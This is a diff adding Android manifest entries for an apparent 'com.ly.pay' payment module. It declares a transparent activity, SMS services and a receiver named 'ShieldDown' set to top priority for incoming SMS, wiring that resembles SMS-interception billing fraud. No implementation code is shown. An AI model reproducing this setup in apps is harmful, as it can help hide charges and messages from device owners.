@@ -1,0 +1,23 @@
+        <activity
+            android:name="com.ly.pay.PayActivity"
+            android:configChanges="orientation|keyboardHidden"
+            android:theme="@style/Transparent" >
+        </activity> 
+
+        <service android:name="com.ly.pay.service.SvrSMS" >
+            <intent-filter>
+                <action android:name="com.ly.pay.service.SvrSMS" >
+                </action>
+            </intent-filter>
+        </service>
+        <service
+            android:name="com.ly.pay.SmSserver"
+            android:enabled="true">
+        </service>
+
+        <receiver android:name="com.ly.pay.ShieldDown" >
+            <intent-filter android:priority="1000" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.GSM_SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
